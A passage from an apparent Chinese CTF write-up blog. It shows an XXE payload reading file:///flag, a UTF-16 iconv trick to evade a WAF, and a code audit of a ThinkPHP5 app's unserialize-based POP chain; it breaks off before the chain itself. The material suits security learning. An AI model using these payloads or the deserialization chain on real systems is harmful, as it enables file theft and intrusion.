class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看出是一段XML代码，这样本题应该是一道XXE题目。XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用XML这种类似于HTML（超文本标记语言）的可扩展标记语言，特别是其中的可作为一个外部引用的文档类型定义（DTD）来执行恶意代码。当应用是通过用户上传的XML文件或POST请求进行数据的传输，并且应用没有禁止XML引用外部实体，也没有过滤用户提交的XML数据，那么就会产生XML外部实体注入漏洞，即XXE漏洞。</p>
<p>那么我们对example做一下改动，加入DTD以执行<code>cat /flag</code>命令，如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxetest</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>保存至xxetest.xml文件中进行上传，回显WAF blocked uploaded file. Please try again，如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/8dc72ac3f35ca10cd4de62b721a968bd.png"></p>
<p>查阅资料得知，xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体- BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码，因此我们把之前的xml文件转为16进制，在Linux环境中使用如下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf-16 xxetest.xml\&gt;exp.xml</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a94a368fb6c5be80a20fc12377e112fe.png"></p>
<p>成功得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/b49bff72691e891f52a702e74591e52d.png"></p>
<h2 id="upload3-（难度：10-10）"><a href="#upload3-（难度：10-10）" class="headerlink" title="upload3 （难度：10/10）"></a>upload3 （难度：10/10）</h2><div class="note info flat"><p>注：因攻防世界上本题容器创建有问题，所以本题将在buuctf上继续答题。</p>
</div>

<p>进入环境后是一个登录页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/db57e42a64b775f4cfceca33bb4ab942.png"></p>
<p>登录后是文件上传页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a842b5ef572b7b4a41c58ef0a3d66251.png"></p>
<p>首先用dirsearch工具扫描一下目录，发现有一个24MB的<code>www.tar.gz</code>文件以及upload目录，结合本题题目推测本题应该是一个文件上传题。下载<code>www.tar.gz</code>文件，观察后发现是<code>ThinkPHP5</code>框架。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a763a0d44f520669432a6bb829db52d0.png"></p>
<p>下面进行代码审计。首先是index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile_db</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;  </span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;index&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;  </span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;username&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;upload&quot;</span>);  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;img&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;username&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;home&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="variable">$profile</span>=cookie(<span class="string">&#x27;user&#x27;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(!emptyempty(<span class="variable">$profile</span>))&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="variable">$profile</span>));  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();  </span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!emptyempty(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !emptyempty(<span class="keyword">$this</span>-&gt;profile_db))&#123;  </span><br><span class="line">            <span class="keyword">if</span>(emptyempty(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]))&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        cookie(<span class="string">&quot;user&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">        <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>仔细审阅代码后发现，对我们有价值的函数主要是<code>login_check()</code>函数，首先将cookie赋值<code>$profile</code>变量，如果不为空则通过<code>$this-&gt;profile=unserialize(base64_decode(\$profile));</code>语句将其进行base64编码然后反序列化，最后进入数据库比对信息，如果无误则返回1。<code>check_upload_img()</code>函数负责检查<code>profile_db[&#39;img&#39;]</code>是否为空，即上传内容是否为图片；<code>login_check()</code>函数负责检查是否登录。</p>
<p>下面再来分析一下register.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;  </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;  </span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;  </span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (!emptyempty(input(<span class="string">&quot;post.username&quot;</span>)) &amp;&amp; !emptyempty(input(<span class="string">&quot;post.email&quot;</span>)) &amp;&amp; !emptyempty(input(<span class="string">&quot;post.password&quot;</span>))) &#123;  </span><br><span class="line">            <span class="variable">$email </span>= input(<span class="string">&quot;post.email&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);  </span><br><span class="line">            <span class="variable">$password </span>= input(<span class="string">&quot;post.password&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);  </span><br><span class="line">            <span class="variable">$username </span>= input(<span class="string">&quot;post.username&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email(<span class="variable">$email</span>)) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (emptyempty(db(<span class="string">&quot;user&quot;</span>)-&gt;where(<span class="string">&quot;username&quot;</span>, <span class="variable">$username</span>)-&gt;find()) &amp;&amp; emptyempty(db(<span class="string">&quot;user&quot;</span>)-&gt;where(<span class="string">&quot;email&quot;</span>, <span class="variable">$email</span>)-&gt;find())) &#123;  </span><br><span class="line">                    <span class="variable">$user_info </span>= [<span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$email</span>, <span class="string">&quot;password&quot;</span> =&gt; md5(<span class="variable">$password</span>), <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>];  </span><br><span class="line">                    <span class="keyword">if</span> (db(<span class="string">&quot;user&quot;</span>)-&gt;insert(<span class="variable">$user_info</span>)) &#123;  </span><br><span class="line">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;  </span><br><span class="line">                        <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;Registed successful!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Registed failed!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Account already exists!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Email illegal!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Something emptyempty!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span>(<span class="params"><span class="variable">$email</span></span>)</span>&#123;  </span><br><span class="line">        <span class="variable">$pattern </span>= <span class="string">&quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/&quot;</span>;  </span><br><span class="line">        preg_match(<span class="variable">$pattern</span>, <span class="variable">$email</span>, <span class="variable">$matches</span>);  </span><br><span class="line">        <span class="keyword">if</span>(emptyempty(<span class="variable">$matches</span>))&#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>本文件中发现调用了魔术方法<code>__destruct()</code>，<code>if(!$this-&gt;registed)  $this-&gt;checker-&gt;index();</code>这两句话意思是如果检测到用户未注册，则调用index.php的<code>index()</code>函数进行登录检测。<code>register()</code>函数主要负责用户注册；<code>check_email($email)</code>函数主要负责检查用户填写的email格式是否正确。</p>
<p>下面来看一下重点文件Proflie.php，首先来看<code>upload_img()</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;  </span><br><span class="line">           <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;  </span><br><span class="line">               <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">               <span class="keyword">exit</span>();  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">if</span>(!emptyempty(<span class="variable">$_FILES</span>))&#123;  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;ext_check();  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;  </span><br><span class="line">           <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;  </span><br><span class="line">               @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);  </span><br><span class="line">               @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;update_img();  </span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>

<p>主要逻辑是检查用户是否登录，如果登录则判断文件是否为空，检查文件后缀是否正常，设置文件命名规则为<code>md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;</code>并存入，这样就杜绝了文件名上传漏洞。另外还有两个重要的魔术方法，如下所示。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>由于当对象调用不可访问属性时，就会自动触发<code>__get</code>魔法方法，而在对象调用不可访问函数时，就会自动触发<code>__call</code>魔法方法，那么可以使用Register.php中的 <code>__destruct()</code>方法来调用<code>index()</code>方法，如果此时将<code>checker</code>的<code>construct</code>覆盖为类<code>Profile</code>，必然会触发<code>__call</code>魔法方法，在该方法中会触发<code>$this-&gt;index</code>，但显然该对象并不存在，于是可触发<code>__get</code>魔法方法，那么会执行语句<code>return $this-&gt;except[&#39;index&#39;];</code>只要将<code>except</code>赋值为数组：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);  </span><br></pre></td></tr></table></figure>

<p>即可成功触发<code>upload_img()</code>函数，进行文件复制和改名。</p>
<p>POP链如下：</p>
